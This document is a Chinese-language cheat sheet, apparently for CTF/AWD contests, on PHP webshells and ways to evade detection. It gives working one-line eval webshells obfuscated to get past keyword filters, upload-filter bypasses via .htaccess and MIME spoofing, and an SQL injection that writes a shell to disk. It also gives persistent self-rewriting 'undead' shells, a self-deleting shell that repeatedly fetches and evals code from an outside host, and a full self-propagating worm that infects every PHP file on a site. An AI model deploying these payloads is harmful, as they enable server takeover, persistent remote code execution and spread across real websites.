# Php一句话木马免杀、绕过方法总结



## 系统命令执行方法：

### get 型：

```bash
http://www.example.com/get.php?cmd=system('cat /flag');
```

### post 型：

```bash
http://www.example.com/post.php
//post data
cmd=system('cat /flag');
```



## 变种免杀：

### 基础一句话：

```php
<?php @eval($_POST['cmd']);?>
```



### 无 php 标签：

```php
<?=eval($_POST['cmd']);
```



### 使用 script 标签绕过 " ? " 过滤：

```php
<script language="php">@eval($_POST['cmd'])</script>
```



### substr_replace() 绕过 assert/eval 关键词过滤：

```php
<?php
$a = substr_replace('assxxx','ert',3);
@$a($_POST['cmd']);
?>
```



### 利用 chr() 返回 ASCII 值：

```php
<?php
$a = chr(0x61).chr(0x73).chr(0x73).chr(0x65).chr(0x72).chr(0x74);
@$a($_POST['cmd']);
?>
```

 

### 利用 strrev() 反转字符串：

```php
<?php
$a = strrev('tressa');;
@$a($_POST['cmd']);
?>
```



### 利用 parse_str() 把查询字符串解析到变量中：

```php
<?php
parse_str("name=assert");
$name($_POST['cmd']);
?>
```



### 综合免杀（类，异或编码，字符拼接）：

```php
<?php
 class ZXVG
 {
     public $c='';
     public function __destruct()
     {
         $_0='&'^"\x47";
         $_1='C'^"\x30";
         $_2='A'^"\x32";
         $_3='v'^"\x13";
         $_4='J'^"\x38";
         $_5='f'^"\x12";
         $db=$_0.$_1.$_2.$_3.$_4.$_5;
         return @$db($this->c);
     }
 }
 $zxvg=new ZXVG();
 @$zxvg->c=$_POST['cmd'];
 ?>
```

## 绕过上传过滤：

### 上传 .htaccess :

上传一个 .htaccess 文件:

```htaccess
SetHandler application/x-httpd-php
```

所有的文件都会解析为 php，接下来上传图片马即可。

### MIME检查：

使用 BurpSuite 抓包修改 Content-type:image/jpeg 。

## 其他上传漏洞：

### 利用 sql 注入漏洞生成一句话木马：

```sql
http://www.example.com/sqlsearch.php
//post data
key=1' union  select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/html/sql.php'#
```

在 /var/www/html/ 目录下生成 sql.php 一句话马。

## php 不死马：

### 初代：

```php
<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = '<?php if(md5($_GET["pass"])=="6e8a4a1315d36cee9584241e13c531ba"){@eval($_POST[a]);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2021-8-11 12:45:00" .index.php');
    usleep(5000);
} 
?>
//pass = l4g2333 用法：/.index.php?pass=l4g2333&a=system('cat /flag');

```

### 修改版：

```php
<?php
 ignore_user_abort(true);
 set_time_limit(0);
 $file = 'c.php';
 $code = base64_decode('PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+');
 while(true) {
     if(md5(file_get_contents($file))===md5($code)) {
         file_put_contents($file, $code);
     }
     usleep(50);
 }
?>
//生成马：<?php eval($_POST[c]);?>

```

### 竞争删除一句话木马：

查看不死马进程

```bash
ps aux 		#列出所有进程，找到要杀掉的进程运用命令
kill -9 -1 ___  	#9：杀死一个进程 1：重新加载进程
ps aux | grep www-data | awk '{print $2}' | xargs kill -9 |rm -rf .webshell.php |mkdir .webshell.php
```

编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果

```php
<?php
	ignore_user_abort(true);
	set_time_limit(0);
	while (1) {
    	$pid = 不死马的进程PID;
    	@unlink(".1.php");
    	exec("kill -9 $pid");
    	usleep(1000);
    }
?>

```

## 无文件木马

所谓无文件木马，这里指的是自删除的木马，在运行一次后会将自身文件删除，但将某些代码运行至进程中

例如：

```php
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

$remote_file = 'http://www.evilsite.com/eval.txt';
while($code = file_get_contents($remote_file)){
  @eval($code);
  sleep(5);
};
?>
```

eval.txt中的内容可进行自定义

如上代码，在访问一次后会自删除，但eval.txt中的代码依旧会在后台执行。

## 蠕虫马

一提到蠕虫，就知道这是一个交叉感染的[木马](https://secvery.com/tag/木马)，它可以把本地的php会写shell插入到其他php原文件，还增加了相互复活机制，后期增加与其他已感染的主机中的webshell互相复活

来自于 3s_NWGeek 的代码：

```php
<?php
$tips = 'AWD_Light_Check';
//这个是后面检查的是否感染头，如果没有，就会重写这个php
error_reporting(0);
$Serv_Num = 159;
//这个变量是要写入其他文件头部的本页行数，因为感染了其他php要互相感染，不能把其他原有php代码写入到其他php，会乱套。
$arr_dir = array();
//全局变量，扫到的文件夹
$files = array();
//全局变量，扫到的文件
if (!function_exists('Url_Check')) {
    function Url_Check()
    {
        $pageURL = 'http';
        if ($_SERVER["HTTPS"] == "on") {
            $pageURL .= "s";
        }
        $pageURL .= '://';
        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"];
        return $pageURL;
    }
    function file_check($dir)
    {
        //扫描文件夹
        global $arr_dir;
        global $files;
        if (is_dir($dir)) {
            if ($handle = opendir($dir)) {
                while (($file = readdir($handle)) !== false) {
                    if ($file != '.' && $file != "..") {
                        if (is_dir($dir . "/" . $file)) {
                            $arr_dir[] = $dir;
                            $files[$file] = file_check($dir . "/" . $file);
                            //拼接文件
                        } else {
                            $arr_dir[] = $dir;
                            $files[] = $dir . "/" . $file;
                        }
                    }
                }
            }
        }
        closedir($handle);
        $arr_dir = array_unique($arr_dir);
        //去重
    }
    function write_conf()
    {
        #每个目录创一个马
        global $Serv_Num;
        global $arr_dir;
        foreach ($arr_dir as $dir_path) {
            // echo '<br>'.$dir_path;
            $srcode = '';
            $localtext = file(__FILE__);
            for ($i = 0; $i < $Serv_Num; $i++) {
                $srcode .= $localtext[$i];
            }
            //所有文件夹都生成一个webshell
            // echo "<span style='color:#666'></span> " . $dir_path . "/.Conf_check.php" . "<br/>";
            $le = Url_Check();
            echo '<iframe id="check_url">' . $le . '' . str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir_path . "/.Conf_check.php") . '</iframe>';
            fputs(fopen($dir_path . "/.Conf_check.php", "w"), $srcode);
        }
        // 当前目录所有php被感染
    }
    function vul_tran()
    {
        //每个文件夹递归生成一个默认的马以及感染当前目录所有php文件。所谓感染就是把自身固定的代码插入到其他php文件中，甚至可以加注释符号或者退出函数exit()；控制其他页面的可用性。不过要注意一下，是当前目录，这样响应速度会快很多，亲测如果是一次性感染全部目录的php文件后续会引发py客户端响应超时及其他bug，所以改过来了。
        //######
        global $Serv_Num;
        $pdir = dirname(__FILE__);
        //要获取的目录
        //先判断指定的路径是不是一个文件夹
        if (is_dir($pdir)) {
            if ($dh = opendir($pdir)) {
                while (($fi = readdir($dh)) != false) {
                    //文件名的全路径 包含文件名
                    $file_Path = $pdir . '/' . $fi;
                    if (strpos($file_Path, '.php')) {
                        //筛选当前目录.php后缀
                        $le = Url_Check();
                        $file_Path = str_replace('\\', '/', $file_Path);
                        echo '<iframe id="check_url">' . $le . '' . str_replace($_SERVER['DOCUMENT_ROOT'], '', $file_Path) . '</iframe>';
                        $ftarget = file($file_Path);
                        if (!strpos($ftarget[0], 'AWD_Light_Check')) {
                            //检查头部是否传播
                            $scode = '';
                            $localtext = file(__FILE__);
                            for ($i = 0; $i < $Serv_Num; $i++) {
                                $scode .= $localtext[$i];
                            }
                            $code_check = '';
                            $file_check = fopen($file_Path, "r");
                            //复制要传播的文件代码，进行重写
                            while (!feof($file_check)) {
                                $code_check .= fgets($file_check) . "\n";
                            }
                            fclose($file_check);
                            $webpage = fopen($file_Path, "w");
                            fwrite($webpage, $scode . $code_check);
                            fclose($webpage);
                        }
                    }
                }
                closedir($dh);
            }
        }
    }
}
///////////////////////////////////////////////////////////////////////////////////
//主函数
try {
    //定义特征才启动传播模式，特征值为_
    if (isset($_GET['_'])) {
        $host = Url_Check();
        file_check($_SERVER['DOCUMENT_ROOT']);
        //全局扫描
        write_conf();
        //写入单文件
        vul_tran();
        //感染当前目录
    } elseif (isset($_GET['time']) && isset($_GET['salt']) && isset($_GET['sign'])) {
        #客户端数字签名校验
        $Check_key = '9c82746189f3d1815f1e6bfe259dac29';
        $Check_api = $_GET['check'];
        $timestamp = $_GET['time'];
        $salt = $_GET['salt'];
        $csign = $_GET['sign'];
        $sign = md5($Check_api . $Check_key . $timestamp . $salt);
        if ($sign === $csign) {
            $nomal_test = '';
            for ($i = 0; $i < strlen($Check_api); $i++) {
                $nomal_test .= chr(ord($Check_api[$i]) ^ $i % $salt);
            }
            $nomal_test = base64_decode($nomal_test);
            $nowtime = time();
            if (abs($nowtime - $timestamp) <= 5) {
                $enc = base64_encode(rawurlencode(`{$nomal_test}`));
                //解密并执行命令在加密返回
                $pieces = explode("i", $enc);
                $final = "";
                foreach ($pieces as $val) {
                    $final .= $val . "cAFAcABAAswTA2GE2c";
                }
                $final = str_replace("=", ":kcehc_revres", $final);
                echo strrev(substr($final, 0, strlen($final) - 18));
                exit;
            } else {
                header('HTTP/1.1 500 Internal Server Error');
            }
        } else {
            header('HTTP/1.1 500 Internal Server Error');
        }
    } else {
        header('HTTP/1.1 500 Internal Server Error');
    }
} catch (Exception $e2) {
}
```

作者原文：带一个参数访问我的webshell，全站的php文件都被我感染，都可以当webshell连，都可以执行命令，只要带一个参数访问都可以互相复活。
